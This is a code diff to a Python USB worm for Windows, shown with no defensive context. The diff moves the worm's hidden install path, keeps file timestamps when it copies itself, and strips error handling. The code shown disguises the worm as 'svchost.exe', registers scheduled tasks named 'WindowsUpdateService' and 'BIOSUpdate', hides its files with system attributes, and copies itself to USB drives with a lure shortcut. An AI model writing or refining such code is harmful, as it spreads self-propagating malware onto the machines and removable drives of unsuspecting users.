@@ -11,7 +11,7 @@ from win32com.shell import shell
 
 WORM_NAME = "svchost.exe"
 PAYLOAD_NAME = "init.exe"
-WORM_PATH = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Templates', WORM_NAME) 
+WORM_PATH = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'SystemData', WORM_NAME) 
 PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
 WORM_TASK_NAME = "WindowsUpdateService"  
 PAYLOAD_TASK_NAME = "BIOSUpdate"  
@@ -57,15 +57,11 @@ def create_scheduled_tasks(self_only = False):
             f.write("done")
 
 def install_worm():
-    if os.path.exists(WORM_PATH):
-        try:
-            os.remove(WORM_PATH)
-        except Exception as e:
-            print(f"Cannot delete existing file: {e}")
+    if os.path.exists(WORM_PATH): os.remove(WORM_PATH)
     exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
     if not os.path.exists(os.path.dirname(WORM_PATH)):
         os.makedirs(os.path.dirname(WORM_PATH))
-    shutil.copy(exe_path, WORM_PATH)
+    shutil.copy2(exe_path, WORM_PATH)
     subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)
 
 def create_shortcut(drive):
@@ -85,7 +81,7 @@ def create_shortcut(drive):
 def infect_usb(drive):
     exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
     worm_dest = os.path.join(drive, WORM_NAME)
-    shutil.copy(exe_path, worm_dest)
+    shutil.copy2(exe_path, worm_dest)
     subprocess.run(f"attrib +h +s +r {worm_dest}", shell=True)  # Hide worm
     create_shortcut(drive)  # Create lure shortcut
 
